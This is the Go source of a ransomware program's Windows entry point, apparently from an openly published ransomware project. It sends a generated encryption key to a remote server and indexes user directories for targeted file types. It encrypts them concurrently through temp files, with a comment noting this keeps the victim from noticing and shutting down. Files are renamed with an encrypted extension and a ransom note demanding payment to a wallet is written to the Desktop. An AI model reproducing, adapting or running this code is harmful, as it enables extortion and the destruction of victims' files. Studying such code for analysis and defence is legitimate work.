// +build windows
// +build go1.7

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/mauri870/ransomware/client"
	"github.com/mauri870/ransomware/cmd"
	"github.com/mauri870/ransomware/cryptofs"
	"github.com/mauri870/ransomware/utils"
)

var (
	// Time to keep trying persist new keys on server
	SecondsToTimeout = 5.0

	// Create a struct to store the files to rename after encryption
	FilesToRename struct {
		Files []*cryptofs.File
		sync.Mutex
	}
)

func init() {
	// If you compile this program without "-H windowsgui" ldflag
	// you can see a console window with all actions performed by
	// the malware. Otherwise, the prints above and all logs will be
	// discarted and it will run in background
	//
	// Fun ASCII
	cmd.PrintBanner()

	// Execution locked for windows
	cmd.CheckOS()
}

func main() {
	// Hannibal ad portas
	encryptFiles()

	// If in console mode, wait for enter to close the window
	var s string
	fmt.Println("Press enter to quit")
	fmt.Scanf("%s", &s)
}

func encryptFiles() {
	keys := make(map[string]string)
	start := time.Now()
	// Loop creating new keys if server return a validation error
	for {
		// Check for timeout
		if duration := time.Since(start); duration.Seconds() >= SecondsToTimeout {
			cmd.Logger.Println("Timeout reached. Aborting...")
			return
		}

		// Generate the id and encryption key
		keys["id"], _ = utils.GenerateRandomANString(32)
		keys["enckey"], _ = utils.GenerateRandomANString(32)

		// Create the json payload
		payload := fmt.Sprintf(`{"id": "%s", "enckey": "%s"}`, keys["id"], keys["enckey"])

		// Encrypt the payload and send to server
		res, err := client.SendPayload("/api/keys/add", payload, url.Values{})
		if err != nil {
			cmd.Logger.Println("The server refuse connection. Aborting...")
			return
		}

		// handle possible response statuses
		switch res.StatusCode {
		case 200, 204:
			// \o/
			break
		default:
			response := struct {
				Status  int    `json:"status"`
				Message string `json:"message"`
			}{}
			// Parse the json response
			if err = json.NewDecoder(res.Body).Decode(&response); err != nil {
				cmd.Logger.Println(err)
				continue
			}
			cmd.Logger.Printf("%d - %s\n", response.Status, response.Message)
			continue
		}

		// Success, proceed
		break
	}

	cmd.Logger.Println("Walking interesting dirs and indexing files...")

	// Add a goroutine to the WaitGroup
	cmd.Indexer.Add(1)

	// Indexing files in a concurrently thread
	go func() {
		// Decrease the wg count after finish this goroutine
		defer cmd.Indexer.Done()

		// Loop over the interesting directories
		for _, folder := range cmd.InterestingDirs {
			filepath.Walk(folder, func(path string, f os.FileInfo, err error) error {
				if err != nil {
					cmd.Logger.Println(err)
					return err
				}

				if utils.StringInSlice(filepath.Base(path), cmd.SkippedDirs) {
					cmd.Logger.Printf("Skipping dir %s", path)
					return filepath.SkipDir
				}

				ext := strings.ToLower(filepath.Ext(path))

				// If the file is not a folder and have a size lower than the max specified
				// The ext must have at least the dot and the extension letter(s)
				if !f.IsDir() && f.Size() <= cmd.MaxFileSize && len(ext) >= 2 {
					// Matching extensions
					if utils.StringInSlice(ext[1:], cmd.InterestingExtensions) {
						// Each file is processed by a free worker on the pool
						// Send the file to the MatchedFiles channel then workers
						// can imediatelly proccess then
						cmd.Logger.Println("Matched:", path)
						cmd.Indexer.Files <- &cryptofs.File{FileInfo: f, Extension: ext[1:], Path: path}

						//for each file we need wait for the goroutine to finish
						cmd.Indexer.Add(1)
					}
				}
				return nil
			})
		}

		// Close the MatchedFiles channel after all files have been indexed and send to then
		close(cmd.Indexer.Files)
	}()

	// Process files that are sended to the channel
	// Launch NumWorkers workers for handle the files concurrently
	for i := 0; i < cmd.NumWorkers; i++ {
		go func() {
			for {
				select {
				case file, ok := <-cmd.Indexer.Files:
					// Check if has nothing to receive from the channel(it's closed)
					if !ok {
						return
					}
					defer cmd.Indexer.Done()

					cmd.Logger.Printf("Encrypting %s...\n", file.Path)

					// We need make a temporary copy of the file for store the encrypted content
					// before move then to the original file
					// This is necessary because if has many files the victim can observe the
					// encrypted names appear and turn off the computer before the process is completed
					// The files will be renamed later, after all have been encrypted properly
					//
					// Create/Open the temporary output file
					tempFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
					if err != nil {
						cmd.Logger.Println(err)
						return
					}
					defer tempFile.Close()

					// Encrypt the file sending the content to temporary file
					err = file.Encrypt(keys["enckey"], tempFile)
					if err != nil {
						cmd.Logger.Println(err)
						continue
					}

					// We need close the tempfile before proceed
					tempFile.Close()

					// Here we can move the tempFile to the original file
					err = file.ReplaceBy(cmd.TempDir + file.Name())
					if err != nil {
						cmd.Logger.Println(err)
						continue
					}

					// Schedule the file to rename it later
					//
					// Protect the slice with a Mutex for prevent race condition
					FilesToRename.Lock()
					FilesToRename.Files = append(FilesToRename.Files, file)
					FilesToRename.Unlock()
				}
			}
		}()
	}

	// Wait for all goroutines to finish
	cmd.Indexer.Wait()

	// List of files encrypted
	var listFilesEncrypted []string

	// Rename the files after all have been encrypted
	cmd.Logger.Println("Renaming files...")
	for _, file := range FilesToRename.Files {
		// Replace the file name by the base64 equivalent
		newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)

		// Rename the original file to the base64 equivalent
		err := os.Rename(file.Path, newpath+cmd.EncryptionExtension)
		if err != nil {
			cmd.Logger.Println(err)
			continue
		}

		// Append the current filepath on the encrypted list
		listFilesEncrypted = append(listFilesEncrypted, file.Path)
	}

	message := `
	<pre>
	YOUR FILES HAVE BEEN ENCRYPTED USING A
	STRONG AES-256 ALGORITHM.

	YOUR IDENTIFICATION IS
	%s

	SEND %s TO THE FOLLOWING WALLET
	%s

	AND AFTER PAY CONTACT %s
	SENDING YOUR IDENTIFICATION TO RECOVER
	THE KEY NECESSARY TO DECRYPT YOUR FILES
	</pre>
	`
	content := []byte(fmt.Sprintf(message, keys["id"], cmd.Price, cmd.Wallet, cmd.ContactEmail))

	// Write the READ_TO_DECRYPT on Desktop
	ioutil.WriteFile(cmd.UserDir+"Desktop\\READ_TO_DECRYPT.html", content, 0600)

	// Write a list with all files encrypted
	ioutil.WriteFile(cmd.UserDir+"Desktop\\FILES_ENCRYPTED.html", []byte(strings.Join(listFilesEncrypted, "<br>")), 0600)

	cmd.Logger.Println("Done! Don't forget to read the READ_TO_DECRYPT.html file on Desktop")
}
